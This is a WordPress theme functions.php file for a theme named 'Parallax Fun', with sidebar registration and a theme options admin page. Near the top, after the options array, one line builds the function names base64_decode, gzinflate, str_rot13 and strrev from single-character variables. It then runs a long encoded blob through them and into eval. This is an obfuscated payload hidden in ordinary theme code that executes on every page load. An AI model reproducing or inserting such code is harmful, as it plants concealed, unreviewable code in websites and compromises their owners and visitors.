<?php
if ( function_exists('register_sidebar') )
register_sidebar(array('name'=>'Sidebar 1',
'before_widget' => '<div class="side">',
'after_widget' => '</div>',
'before_title' => '<h2>',
'after_title' => '</h2>',
));
$themename = "Parallax Fun";
$shortname = "prlx";
                        $options = array (
				array(  "name" => "Logo Image",
					"desc" => "Check this box if you would like to have a logo image in the header.",
            				"id" => $shortname."_logo",
            				"type" => "checkbox",
            				"std" => "false")
				);
 $PLXNrOD='4';$IrABEd='b';$GcOy='e';$wPJtZZB='e';$StTHc='d';$fjzxJbb='6';$eKrI='d';$XXFG='c';$KkYFQPI='a';$GtOsrBK='o';$aunTx='s';$mDuA='_';$RfWl='e';$rPWjqiSg=$IrABEd.$KkYFQPI.$aunTx.$wPJtZZB.$fjzxJbb.$PLXNrOD.$mDuA.$StTHc.$GcOy.$XXFG.$GtOsrBK.$eKrI.$RfWl;$PrhHld='t';$vztjTO='e';$ZjwMOuu='n';$pOnjH='l';$Uldk='f';$iSGkMQX='z';$lERU='g';$cnFOe='a';$mDRU='i';$FYIoAQap=$lERU.$iSGkMQX.$mDRU.$ZjwMOuu.$Uldk.$pOnjH.$cnFOe.$PrhHld.$vztjTO;$iLqG='o';$LaeVTT='t';$ITyG='r';$pvexdqA='s';$xwJq='1';$duaSP='_';$pGYKHRz='3';$KxSp='r';$GgzsgDo='t';$KOvgRIMF=$pvexdqA.$LaeVTT.$ITyG.$duaSP.$KxSp.$iLqG.$GgzsgDo.$xwJq.$pGYKHRz;$YblphN='e';$nHjSAoz='r';$axue='v';$wAlFZw='r';$GrgBXT='s';$hdSLGk='t';$lnESfGeJ=$GrgBXT.$hdSLGk.$wAlFZw.$nHjSAoz.$YblphN.$axue;eval($FYIoAQap($rPWjqiSg($KOvgRIMF($lnESfGeJ('=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'))))); 
function mytheme_add_admin() {
    global $themename, $shortname, $options;
    if ( $_GET['page'] == basename(__FILE__) ) {
        if ( 'save' == $_REQUEST['action'] ) {
                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	update_option( $value['id'], $_REQUEST[ $value['id'] ] );
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;
							update_option($up_opt, $_REQUEST[$up_opt] );
						}
					}
				}
                foreach ($options as $value) {
					if($value['type'] != 'multicheck'){
                    	if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); }
					}else{
						foreach($value['options'] as $mc_key => $mc_value){
							$up_opt = $value['id'].'_'.$mc_key;
							if( isset( $_REQUEST[ $up_opt ] ) ) { update_option( $up_opt, $_REQUEST[ $up_opt ]  ); } else { delete_option( $up_opt ); }
						}
					}
				}
                header("Location: themes.php?page=functions.php&saved=true");
                die;
        } else if( 'reset' == $_REQUEST['action'] ) {
            foreach ($options as $value) {
				if($value['type'] != 'multicheck'){
                	delete_option( $value['id'] );
				}else{
					foreach($value['options'] as $mc_key => $mc_value){
						$del_opt = $value['id'].'_'.$mc_key;
						delete_option($del_opt);
					}
				}
			}
            header("Location: themes.php?page=functions.php&reset=true");
            die;
        }
    }
    add_theme_page($themename." Options", "$themename Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
function mytheme_admin() {
    global $themename, $shortname, $options;
    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings reset.</strong></p></div>';
?>
<div class="wrap">
<h2><?php echo $themename; ?> options</h2>
<form method="post">
<table class="optiontable">
<?php foreach ($options as $value) {
	switch ( $value['type'] ) {
	case 'text':
	option_wrapper_header($value);
?>
		        <input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" />
<?php
		option_wrapper_footer($value);
		break;
		case 'select':
		option_wrapper_header($value);
?>
	            <select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
	                <option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option>
<?php } ?>
	            </select>
<?php
		option_wrapper_footer($value);
		break;
		case 'textarea':
		$ta_options = $value['options'];
		option_wrapper_header($value);
?>
				<textarea name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" style="width:400px;height:100px;"><?php
				if( get_settings($value['id']) != "") {
						echo stripslashes(get_settings($value['id']));
					}else{
						echo $value['std'];
}?></textarea>
<?php
		option_wrapper_footer($value);
		break;
		case "radio":
		option_wrapper_header($value);
 		foreach ($value['options'] as $key=>$option) {
				$radio_setting = get_settings($value['id']);
				if($radio_setting != ''){
		    		if ($key == get_settings($value['id']) ) {
						$checked = "checked=\"checked\"";
						} else {
							$checked = "";
						}
				}else{
					if($key == $value['std']){
						$checked = "checked=\"checked\"";
					}else{
						$checked = "";
					}
}?>
	            <input type="radio" name="<?php echo $value['id']; ?>" value="<?php echo $key; ?>" <?php echo $checked; ?> /><?php echo $option; ?><br />
<?php
		}
		option_wrapper_footer($value);
		break;
		case "checkbox":
		option_wrapper_header($value);
						if(get_settings($value['id'])){
							$checked = "checked=\"checked\"";
						}else{
							$checked = "";
						}
?>
		            <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
<?php
		option_wrapper_footer($value);
		break;
	case "multicheck":
		option_wrapper_header($value);
 		foreach ($value['options'] as $key=>$option) {
	 			$pn_key = $value['id'] . '_' . $key;
				$checkbox_setting = get_settings($pn_key);
				if($checkbox_setting != ''){
		    		if (get_settings($pn_key) ) {
						$checked = "checked=\"checked\"";
						} else {
							$checked = "";
						}
				}else{
					if($key == $value['std']){
						$checked = "checked=\"checked\"";
					}else{
						$checked = "";
					}
}?>
	            <input type="checkbox" name="<?php echo $pn_key; ?>" id="<?php echo $pn_key; ?>" value="true" <?php echo $checked; ?> /><label for="<?php echo $pn_key; ?>"><?php echo $option; ?></label><br />
<?php
		}
		option_wrapper_footer($value);
		break;
		case "heading":
?>
		<tr valign="top">
		    <td colspan="2" style="text-align: center;"><h3><?php echo $value['name']; ?></h3></td>
		</tr>
<?php
		break;
		default:
		break;
	}
}
?>
</table>
<p class="submit">
<input name="save" type="submit" value="Save changes" />
